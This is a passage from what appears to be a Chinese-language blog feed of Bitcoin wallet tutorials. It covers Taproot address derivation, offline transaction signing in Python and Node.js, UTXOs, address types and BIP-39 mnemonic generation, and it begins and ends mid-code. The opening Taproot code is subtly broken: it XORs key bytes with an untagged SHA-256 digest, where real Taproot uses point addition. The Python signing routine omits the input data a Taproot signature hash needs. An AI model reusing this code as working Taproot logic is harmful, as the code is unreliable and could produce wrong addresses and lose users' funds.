bip32.get_privkey_from_path(path)<br>    private_key = SigningKey.from_string(child_key, curve=SECP256k1)<br>    public_key = private_key.get_verifying_key().to_string(<span class="hljs-string">&quot;compressed&quot;</span>)<br>    tweak = sha256(<span class="hljs-string">b&#x27;TapTweak&#x27;</span> + public_key[<span class="hljs-number">1</span>:]).digest()<br>    tweaked_pubkey = <span class="hljs-built_in">bytearray</span>(public_key)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        tweaked_pubkey[<span class="hljs-number">1</span> + i] ^= tweak[i]<br>    witver = <span class="hljs-number">1</span>  <span class="hljs-comment"># witness version for Taproot</span><br>    witprog = tweaked_pubkey[<span class="hljs-number">1</span>:<span class="hljs-number">33</span>]<br>    address = bech32.encode(<span class="hljs-string">&#x27;bc&#x27;</span>, witver, witprog)<br>    <span class="hljs-keyword">return</span> address<br></code></pre></td></tr></table></figure><h1 id="6-离线签名"><a href="#6-离线签名" class="headerlink" title="6. 离线签名"></a>6. 离线签名</h1><ul><li>构建交易: 创建并填充交易输入和输出。</li><li>生成交易摘要: 使用交易数据生成 Taproot 交易摘要。</li><li>签名交易: 使用私钥对交易摘要进行签名。</li><li>构建完整交易: 将签名附加到交易中并生成最终的交易。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">buildAndsignTx</span>(<span class="hljs-params">input_list, output_list, private_key, taproot_pubkey</span>):<br>    tx = Transaction()<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">input</span> <span class="hljs-keyword">in</span> input_list:<br>        tx.add_input(<span class="hljs-built_in">input</span>[<span class="hljs-string">&#x27;previous_txid&#x27;</span>], <span class="hljs-built_in">input</span>[<span class="hljs-string">&#x27;index&#x27;</span>])<br>    <span class="hljs-keyword">for</span> output <span class="hljs-keyword">in</span> output_list:<br>        tx.add_output(output[<span class="hljs-string">&quot;address&quot;</span>], output[<span class="hljs-string">&quot;value&quot;</span>])<br>    tx.version = <span class="hljs-number">2</span><br>    tx.locktime = <span class="hljs-number">0</span><br>    sighash = tx.signature_hash()<br>    <br>    tweaked_privkey = taproot_tweak_seckey(private_key, taproot_pubkey)<br>    signature = schnorr.sign(tweaked_privkey, sighash)<br>    <br>    witness = TaprootWitness(taproot_pubkey, signature)<br>    tx.inputs[<span class="hljs-number">0</span>].witness = witness<br><br>    signed_tx = tx.serialize()   <br>     <br>    <span class="hljs-keyword">return</span> signed_tx<br></code></pre></td></tr></table></figure><p>离线签名搞出来，基本交易就OK了，中心化钱包和去中心化钱包的本质区别是私钥管理，签名是一样的。</p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>05 Bitcoin钱包生成和签名</title>
    <link href="/2024/05/27/05Bitcoin%E9%92%B1%E5%8C%85%E7%94%9F%E6%88%90%E5%92%8C%E7%AD%BE%E5%90%8D/"/>
    <url>/2024/05/27/05Bitcoin%E9%92%B1%E5%8C%85%E7%94%9F%E6%88%90%E5%92%8C%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="一-Bitcoin-概览"><a href="#一-Bitcoin-概览" class="headerlink" title="一. Bitcoin 概览"></a>一. Bitcoin 概览</h1><h2 id="1-1-Bitcoin-简介"><a href="#1-1-Bitcoin-简介" class="headerlink" title="1.1 Bitcoin 简介"></a>1.1 Bitcoin 简介</h2><p>比特币（Bitcoin）是由一个或一群化名为中本聪（Satoshi Nakamoto）的人在 2008 年提出，并于 2009 年开始发布的去中心化数字货币。它的出现标志着一种新型金融体系的诞生，具有以下主要特点：</p><p><strong>去中心化</strong>：</p><ul><li>比特币网络没有中央管理机构或中介机构，它通过一个称为区块链的分布式账本来记录所有交易。</li><li>区块链技术确保了所有参与者都可以查看和验证交易，提高了透明度和安全性。</li></ul><p><strong>有限供应</strong>：</p><ul><li>比特币的总供应量被固定在2100万枚，这通过代码内的机制控制。 </li><li>这一机制使比特币具备了抗通胀的特点。</li></ul><p><strong>点对点交易</strong>：</p><ul><li>比特币允许用户之间直接进行交易，不需要通过银行或支付处理机构。 </li><li>这种点对点交易减少了交易成本和处理时间。</li></ul><p><strong>安全性</strong> ：</p><ul><li>比特币使用加密技术确保交易的安全性和隐私性。 </li><li>每一笔交易都需要通过复杂的数学算法进行验证，从而确保系统的完整性。</li></ul><p><strong>不可逆交易</strong>：</p><ul><li>一旦比特币交易被确认，它就无法被撤销。这减少了欺诈的风险，但也意味着用户需要谨慎操作。</li></ul><p><strong>挖矿机制</strong>：</p><ul><li>新的比特币通过一个称为挖矿的过程产生。矿工们使用计算能力来解决复杂的数学问题，成功解决问题的矿工将获得比特币奖励。 </li><li>挖矿不仅生成新币，还维护和保护比特币网络的安全。</li></ul><p><strong>全球流通</strong>：</p><ul><li>比特币可以在全球范围内进行交易，不受地域和国界的限制。 </li><li>它为跨国支付提供了一种高效、低成本的替代方案。</li></ul><p><strong>隐私和匿名性</strong>：</p><ul><li>虽然比特币交易是公开记录的，但用户身份是匿名的。交易是通过地址（类似于账号）进行的，而不是通过真实身份。</li></ul><h2 id="1-2-Bitcoin-的升级次数介绍"><a href="#1-2-Bitcoin-的升级次数介绍" class="headerlink" title="1.2.Bitcoin 的升级次数介绍"></a>1.2.Bitcoin 的升级次数介绍</h2><p>比特币自 2009 年发布以来，经历了多次重要升级。这些升级旨在提高比特币网络的安全性、效率和功能性。</p><p>并且比特币的 Taproot 升级给比特币带来更多的可能性，Taproot 升级带动了 BRC20 和 Bitcoin-Layer2 的发展，</p><p>**P2SH（Pay-to-Script-Hash）2012年 **</p><ul><li>BIP（Bitcoin Improvement Proposal）：BIP-0016 </li><li>内容：允许更复杂的交易脚本，支持多重签名地址。这种升级使得比特币交易更加灵活和安全</li></ul><p>**比特币改进提案 BIP 66    2015年 ** </p><ul><li>BIP：BIP-0066 </li><li>内容：规范了交易中DER格式的签名，解决了交易签名的一致性问题，增强了网络的安全性。</li></ul><p>**CheckSequenceVerify（CSV）2016年 ** ：</p><ul><li><p>BIP：BIP-0112 </p></li><li><p>内容：增加了相对时间锁功能，使得交易可以在指定的时间或块高度之后才生效，这为更复杂的支付通道铺平了道路。</p></li></ul><p>**Segregated Witness（SegWit）2017年 ** </p><ul><li>BIP：BIP-0141, BIP-0143, BIP-0144 </li><li>内容：分离交易签名数据，提高了区块的有效容量，减小了交易体积，降低了交易费用。还解决了交易的可塑性问题，使得闪电网络等侧链解决方案成为可能。</li></ul><p>**隔离见证2x（SegWit2x）2017年 ** </p><ul><li>内容：这次升级是对 SegWit 的后续提案，旨在进一步增加区块大小。然而，由于社区共识未达成，这次升级最终未能实现。</li></ul><p>**Taproot 2021年 ** </p><ul><li>BIP：BIP-0340, BIP-0341, BIP-0342 </li><li>内容：引入了 Schnorr 签名和默克尔化抽象语法树（MAST），增强了隐私性和执行脚本验证的功能，进一步提高了交易的灵活性和效率。这是自2017年 SegWit 以来最重要的一次升级。</li></ul><p>**MAST（Merkelized Abstract Syntax Trees）2021年 ** </p><ul><li><p>BIP：作为 Taproot 的一部分 </p></li><li><p>内容：允许将多种条件的智能合约合并为一个，使得只有满足条件的部分才被公开，提高了隐私性和效率。</p></li></ul><p><strong>Schnorr Signatures</strong> </p><ul><li>BIP：作为 Taproot 的一部分 </li><li>内容：提供了一种更高效和安全的签名算法，允许多重签名聚合，提高了交易的隐私性和可扩展性。</li></ul><h2 id="3-UTXO-介绍"><a href="#3-UTXO-介绍" class="headerlink" title="3.UTXO 介绍"></a>3.UTXO 介绍</h2><p>UTXO（Unspent Transaction Output，<strong>未花费交易输出</strong>）模型是比特币及其他一些加密货币使用的一种记账方法。它与账户模型不同，通过<strong>追踪未花费</strong>的交易输出来记录每个地址的<strong>余额</strong>。以下是UTXO模型的详细介绍：</p><h3 id="3-1-模型解说"><a href="#3-1-模型解说" class="headerlink" title="3.1 模型解说"></a>3.1 模型解说</h3><p>说说一个名词，叫做 Transaction交易，Transaction 和 UTXO 是相辅相成的，先举例：</p><p>张三：通过挖矿得到了120个比特币，</p><p>现在张三饿了，想要花费2个比特币去购买一个面包（假设）。</p><p>现在假设李四是面包店营业主</p><p>张三付给李四将一次性付给李四 120 块，</p><p>李四给张三找零 118 块，这里其实产生了两笔交易，</p><p>咱们可以这样理解，张三的钱被分成了两份，其中 118 打给了自己，剩下的 2 块打给了李四。</p><p>交易与交易之间组成了网状关系，<strong>1 个交易的输出，成为了下 1 个交易的输入；下 1 个交易的输出，又成了下下 1 个交易的输入。</strong></p><p>所有的钱，在这个网络中流动，每 1 笔钱的去向、来源，都是可追溯的，而这也是区块链网络的一个重要特点。</p><p>接下来咱们用比较通俗的方式来说明 UTXO 和 Transaction 到底是什么</p><p>在现实生活中，一笔转账对应的事一个付款人和一个收款人，</p><p>而在比特币中，一笔转账对应的是多个转账人和多个收款人。</p><p>现在咱们仔细分析一下上面的这个例子，对于张三买面包这个案列</p><ul><li>付款人：张三 120块</li><li>收款人：张三 118块，李四 2块</li></ul><p>张三的120，<strong>转118块给自己，转2块给李四，</strong>对应到交易里面，就是这笔交易有<strong>1个输入，2个输出</strong>！</p><p>下面来一个多输入，多输出的案例</p><p>考虑如下场景：</p><p>用户A和用户B之间发生了一个交易T3，A 向 B 转 100 元。</p><p> A的100元来自2笔交易：来自T1：C向A转的80元 + T2：D向A转的30元（共110元，但A只转了100元给B，10元找零返回给A的账号）。 </p><p>同理，C向A转的这80元，来自用户E、F的某次交易…… D向A转的这30元，来自用户E的某次交易……</p><p>这个交易就有2个输入，2个输出：</p><p> 2个输入（也就是2个UTXO）： </p><ul><li><p>T1: C向A转的80元 </p></li><li><p>T2：D向A转的30元</p></li></ul><p>2个输出：</p><ul><li>B：100元 </li><li>A：10元（找零）</li></ul><p>当你理解上面的例子时，我们再来说一下UTXO，理解上面的例子对你理解UTXO会特别有帮助。</p><ul><li>比特币的交易中不是通过账户的增减来实现的，而是一笔笔关联的<strong>输入&#x2F;输出交易事务</strong>。</li><li>每一笔的交易都要花费“<strong>输入</strong>”，然后产生“<strong>输出</strong>”，这个产生的“<strong>输出</strong>”就是所谓的“<strong>未花费过的交易输出</strong>”，也就是<strong>UTXO</strong>。每一笔交易事务都有一个唯一的编号，称为<strong>交易事务ID</strong>，这是通过哈希算法计算而来的，当需要<strong>引用</strong>某一笔交易事务中的<strong>“输出”</strong>时，主要提供<strong>交易事务ID</strong>和所处<strong>“输出”</strong>列表中的<strong>序号</strong>就可以了。</li><li>由于没有账户的概念，因此<strong>当“输入”部分的金额大于所需的“输出”时</strong>，必须给自己<strong>找零</strong>，这个找零也是作为交易的一部分包含在“输出”中。</li><li>旧的 UTXO不断消亡，新的UTXO不断产生。所有的UTXO，组成了UTXO Set 的数据库，存在于每个节点</li><li>任何1笔 UTXO，有且仅可能被1个交易花费1次</li><li>1 个 UTXO，具有如下的表达形式： 1 个 UTXO &#x3D; 1个Transaction ID + Output Index</li></ul><h3 id="2-UTXO模型的区块链钱包余额形式"><a href="#2-UTXO模型的区块链钱包余额形式" class="headerlink" title="2. UTXO模型的区块链钱包余额形式"></a>2. UTXO模型的区块链钱包余额形式</h3><p>深刻理解了UTXO的概念，钱包就很容易理解了，</p><p>某个人的钱包的余额 &#x3D; 属于他的UTXO的总和；在这里，你会发现一个不同于现实世界的“银行”里的一个概念，在银行里，会存储每个账号剩余多少钱。但这里，我们存储的并不是每个账号的余额，而存的是<strong>1笔笔的交易</strong>，也就是<strong>1 笔笔的UTXO</strong>，每个账户的余额是通过<strong>UTXO计算</strong>出来的，而不是<strong>直接存储</strong>余额。</p><h1 id="二-Bitcoin-钱包地址类型"><a href="#二-Bitcoin-钱包地址类型" class="headerlink" title="二. Bitcoin 钱包地址类型"></a>二. Bitcoin 钱包地址类型</h1><p>Bitcoin 钱包地址有几种不同的类型，每种类型都有其特定的用途和特点。主要的几种类型包括：</p><h4 id="P2PKH（Pay-to-PubKeyHash）地址-💡💡"><a href="#P2PKH（Pay-to-PubKeyHash）地址-💡💡" class="headerlink" title="P2PKH（Pay-to-PubKeyHash）地址 💡💡"></a><strong>P2PKH（Pay-to-PubKeyHash）地址</strong> 💡💡</h4><ul><li><strong>传统的 P2PKH</strong> 地址，也叫legacyAddr</li><li>格式：以1开头，例如，1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa。 💡💡</li><li>特点：这是最传统和最常见的地址类型，广泛用于比特币的早期交易。 💡💡</li><li>优点：兼容性好，几乎所有钱包和交易所都支持。 💡💡</li><li>缺点：随着时间的推移，这种地址类型的使用效率较低，交易费用可能会较高。</li></ul><h4 id="P2SH（Pay-to-Script-Hash）地址-💡💡"><a href="#P2SH（Pay-to-Script-Hash）地址-💡💡" class="headerlink" title="P2SH（Pay-to-Script-Hash）地址 💡💡"></a><strong>P2SH（Pay-to-Script-Hash）地址</strong> 💡💡</h4><ul><li><strong>隔离见证 P2SH</strong></li><li>格式：以3开头，例如，3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy。 💡💡</li><li>特点：这种地址允许更复杂的交易脚本，例如多重签名地址。 💡💡</li><li>优点：支持更复杂的交易和脚本，安全性更高。 💡💡</li><li>缺点：创建和管理比P2PKH地址更复杂。</li></ul><h4 id="Bech32（SegWit）地址-💡💡"><a href="#Bech32（SegWit）地址-💡💡" class="headerlink" title="Bech32（SegWit）地址 💡💡"></a><strong>Bech32（SegWit）地址</strong> 💡💡</h4><ul><li><p><strong>原生的隔离见证 Bech32</strong> </p></li><li><p>格式：以 bc1 开头，例如，bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwfvenl。 💡💡</p></li><li><p>特点：这是比特币改进提案BIP-0173中引入的新地址格式，旨在提高交易效率和减少费用。 💡💡</p></li><li><p>优点：交易费用更低，处理速度更快，且有助于减少交易体积。 💡💡</p></li><li><p>缺点：并非所有的钱包和交易所都支持这种地址类型，尽管支持率在逐步增加。</p></li></ul><p>每种地址类型都有其特定的应用场景和优缺点，用户可以根据自己的需求选择合适的地址类型来存储和交易比特币</p><h1 id="三-Bitcoin-离线地址生成代码"><a href="#三-Bitcoin-离线地址生成代码" class="headerlink" title="三. Bitcoin 离线地址生成代码"></a>三. Bitcoin 离线地址生成代码</h1><h2 id="NodeJs-代码"><a href="#NodeJs-代码" class="headerlink" title="NodeJs 代码"></a>NodeJs 代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createAddress</span> (<span class="hljs-attr">params</span>: any): any &#123;<br>    <span class="hljs-keyword">const</span> &#123;seedHex, receiveOrChange, addressIndex, network, method &#125; = params<br>    <span class="hljs-keyword">const</span> root = bip32.<span class="hljs-title function_">fromSeed</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(seedHex, <span class="hljs-string">&#x27;hex&#x27;</span>));<br>    <span class="hljs-keyword">let</span> path = <span class="hljs-string">&quot;m/44&#x27;/0&#x27;/0&#x27;/0/&quot;</span> + addressIndex + <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (receiveOrChange === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>        path = <span class="hljs-string">&quot;m/44&#x27;/0&#x27;/0&#x27;/1/&quot;</span> + addressIndex + <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">const</span> child = root.<span class="hljs-title function_">derivePath</span>(path);<br>    <span class="hljs-keyword">let</span> <span class="hljs-attr">address</span>: string<br>    <span class="hljs-keyword">switch</span>(method) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;p2pkh&quot;</span>:<br>            <span class="hljs-keyword">const</span> p2pkhAddress = bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2pkh</span>(&#123;<br>                <span class="hljs-attr">pubkey</span>: child.<span class="hljs-property">publicKey</span>,<br>                <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network]<br>            &#125;);<br>            address = p2pkhAddress.<span class="hljs-property">address</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;p2wpkh&quot;</span>:<br>            <span class="hljs-keyword">const</span> p2wpkhAddress = bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2wpkh</span>(&#123;<br>                <span class="hljs-attr">pubkey</span>: child.<span class="hljs-property">publicKey</span>,<br>                <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network]<br>            &#125;);<br>            address = p2wpkhAddress.<span class="hljs-property">address</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;p2sh&quot;</span>:<br>            <span class="hljs-keyword">const</span> p2shAddress = bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2sh</span>(&#123;<br>                <span class="hljs-attr">redeem</span>: bitcoin.<span class="hljs-property">payments</span>.<span class="hljs-title function_">p2wpkh</span>(&#123;<br>                    <span class="hljs-attr">pubkey</span>: child.<span class="hljs-property">publicKey</span>,<br>                    <span class="hljs-attr">network</span>: bitcoin.<span class="hljs-property">networks</span>[network]<br>                &#125;),<br>            &#125;);<br>            address = p2shAddress.<span class="hljs-property">address</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-attr">default</span>:<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;This way can not support&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">privateKey</span>: <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(child.<span class="hljs-property">privateKey</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>        <span class="hljs-attr">publicKey</span>: <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(child.<span class="hljs-property">publicKey</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>        address<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码中通过 method 来控制生成的地址类别</p><h1 id="四-Bitcoin-离线签名代码"><a href="#四-Bitcoin-离线签名代码" class="headerlink" title="四. Bitcoin 离线签名代码"></a>四. Bitcoin 离线签名代码</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">buildAndSignTx</span> (<span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">privateKey</span>: string; <span class="hljs-attr">signObj</span>: any; <span class="hljs-attr">network</span>: string; &#125;): string &#123;<br>    <span class="hljs-keyword">const</span> &#123; privateKey, signObj, network &#125; = params;<br>    <span class="hljs-keyword">const</span> net = bitcore.<span class="hljs-property">Networks</span>[network];<br>    <span class="hljs-keyword">const</span> inputs = signObj.<span class="hljs-property">inputs</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">input</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-attr">address</span>: input.<span class="hljs-property">address</span>,<br>            <span class="hljs-attr">txId</span>: input.<span class="hljs-property">txid</span>,<br>            <span class="hljs-attr">outputIndex</span>: input.<span class="hljs-property">vout</span>,<br>            <span class="hljs-attr">script</span>: <span class="hljs-keyword">new</span> bitcore.<span class="hljs-property">Script</span>.<span class="hljs-title function_">fromAddress</span>(input.<span class="hljs-property">address</span>).<span class="hljs-title function_">toHex</span>(),<br>            <span class="hljs-attr">satoshis</span>: input.<span class="hljs-property">amount</span><br>        &#125;<br>    &#125;);<br>    <span class="hljs-keyword">const</span> outputs = signObj.<span class="hljs-property">outputs</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">output</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-attr">address</span>: output.<span class="hljs-property">address</span>,<br>            <span class="hljs-attr">satoshis</span>: output.<span class="hljs-property">amount</span><br>        &#125;;<br>    &#125;);<br>    <span class="hljs-keyword">const</span> transaction = <span class="hljs-keyword">new</span> bitcore.<span class="hljs-title class_">Transaction</span>(net).<span class="hljs-title function_">from</span>(inputs).<span class="hljs-title function_">to</span>(outputs);<br>    transaction.<span class="hljs-property">version</span> = <span class="hljs-number">2</span>;<br>    transaction.<span class="hljs-title function_">sign</span>(privateKey);<br>    <span class="hljs-keyword">return</span> transaction.<span class="hljs-title function_">toString</span>();<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>04 HD钱包助记词生成与验证</title>
    <link href="/2024/05/25/04HD%E9%92%B1%E5%8C%85%E5%8A%A9%E8%AE%B0%E8%AF%8D%E7%94%9F%E6%88%90/"/>
    <url>/2024/05/25/04HD%E9%92%B1%E5%8C%85%E5%8A%A9%E8%AE%B0%E8%AF%8D%E7%94%9F%E6%88%90/</url>
    
    <content type="html"><![CDATA[<h1 id="HD钱包助记词生成与验证"><a href="#HD钱包助记词生成与验证" class="headerlink" title="HD钱包助记词生成与验证"></a>HD钱包助记词生成与验证</h1><h2 id="1-助记词生成原理"><a href="#1-助记词生成原理" class="headerlink" title="1.助记词生成原理"></a>1.助记词生成原理</h2><p><strong>1.1.随机熵生成</strong> 首先生成一段随机<strong>熵</strong>（Entropy）。熵的长度可以是 128 到 256 位，并且是 32 的倍数。常见的熵长度有 128 位（12 个助记词）和 256 位（24 个助记词）。每增加3个单词，</p><p>12个助记词对应128位熵，15个对应160位熵，18个对应192，21个对应224位，24个对应256，</p><p>每增加3个单词，增加32位熵，</p><p>随机熵的生成32</p><p><strong>1.2.计算校验和</strong> 对熵进行 <strong>SHA-256 哈希</strong>计算，并取哈希值的前几位作为校验和。校验和的<strong>长度</strong>取决于熵的长度。&#x3D;熵的长度 ÷ 32，除以32后得到的值就是他要校验的位数</p><p>例如，128 位熵需要 <strong>4 位</strong>校验和（因为 128 &#x2F; 32 &#x3D; 4），256 位熵需要 8 位校验和。160&#x2F;32&#x3D;5，192&#x2F;32&#x3D;6，224&#x2F;32&#x3D;7……</p><p><strong>1.3.组合熵和校验</strong> 将校验和附加到熵的<strong>末尾</strong>，形成一个新的<strong>二进制序列</strong>。这个序列的总长度为 (熵的长度 + 校验和的长度)。</p><p><strong>1.4.分割为助记词索引</strong> 将组合后的二进制序列分割成每组 11 位的片段，每个片段转换为一个数字，这个数字作为助记词列表中的索引。</p><p><strong>1.5.映射为助记词</strong> 使用这些索引从预定义的 <strong>2048 个</strong>助记词列表（<strong>BIP-39</strong> 词库）中提取相应的助记词。这些助记词就是最终的助记词短语</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 生成助记词</span><br><br><span class="hljs-comment"># 1.1.随机熵生成</span><br><span class="hljs-comment"># 首先生成一段随机熵（Entropy）。熵的长度可以是 128 到 256 位，并且是 32 的倍数。常见的熵长度有 128 位（12 个助记词）和 256 位（24 个助记词）。</span><br><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> bip39<br><br><span class="hljs-comment"># 1.1.随机熵生成</span><br><span class="hljs-comment"># entropy = os.urandom(16) </span><br><span class="hljs-comment"># os模块的生成16位的随机字节，这里是生成128位的熵，128位的熵就是16字节8位一个字节，128位的熵生成的是12个助记词</span><br><span class="hljs-comment"># 同理，如果我现在要15个词的助记词，那就是对应128+32=160位的熵，除以8位字节就是20个字节，</span><br><span class="hljs-comment"># 同理：如果我现在要18个词的助记词，那就是对应的160+32=192位的熵，除以8个字节就是24个字节</span><br>entropy = <span class="hljs-string">b&#x27;\xfb\xe50\xc5\x84\xb6\x06&#123;.n\x12\x06SN\xb5\x82&#x27;</span><br><span class="hljs-built_in">print</span>(entropy)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1.2.计算校验和</span><br><span class="hljs-string">对熵进行 SHA-256 哈希计算，并取哈希值的前几位作为校验和。sub scrip table</span><br><span class="hljs-string">校验和的长度取决于熵的长度。例如，128 位熵需要 4 位校验和（因为 128 / 32 = 4），256 位熵需要 8 位校验和</span><br><span class="hljs-string">最后截取前4位出来即可</span><br><span class="hljs-string">如果是128+32=160位熵，160÷32=5位校验和，那就要提取前5位出来</span><br><span class="hljs-string">如果是160+32=192位熵，192÷32=6位校验和，那就要提取前6位出来</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#首先，hashlib.sha256(entropy)创建一个SHA-256哈希算法对象，并将entropy作为输入进行哈希计算。</span><br><span class="hljs-comment"># 然后，.digest()方法被调用，返回计算得到的哈希结果的二进制表示。这个二进制表示是一个字节数组（bytes），长度为32字节（256位），表示SHA-256算法对输入数据的哈希结果。</span><br>hash_bytes = hashlib.sha256(entropy).digest()<br><span class="hljs-built_in">print</span>(hash_bytes) <span class="hljs-comment"># b&#x27;s\xf7\xc9z\x88\xf0\x7f\x0f\xf0`(\xe4\xd6\x92@\xa9?\xa2os~\xbe*\x86\xe7w\x97D\xf8Z&quot;\xb4&#x27;</span><br><span class="hljs-comment"># entropy_sha256[0]表示entropy_sha256的第一个字节，它是一个整数值。</span><br><span class="hljs-comment"># bin(entropy_sha256[0])将该整数值转换为对应的二进制字符串，返回的字符串以0b开头，例如0b11001010。</span><br><span class="hljs-comment"># [2:]是对二进制字符串进行切片操作，去掉开头的0b，例如11001010。</span><br><span class="hljs-comment"># .zfill(8)将二进制字符串填充到8位，不足的位数在开头补零，例如11001010变为11001010。</span><br><span class="hljs-comment"># [:4]是对二进制字符串进行切片操作，截取前4位，例如11001010变为1100。</span><br><span class="hljs-comment"># 结果被赋值给变量entropy_bin，表示对entropy_sha256的第一个字节进行处理后得到的二进制字符串，长度为4位。</span><br>checksum_bits = <span 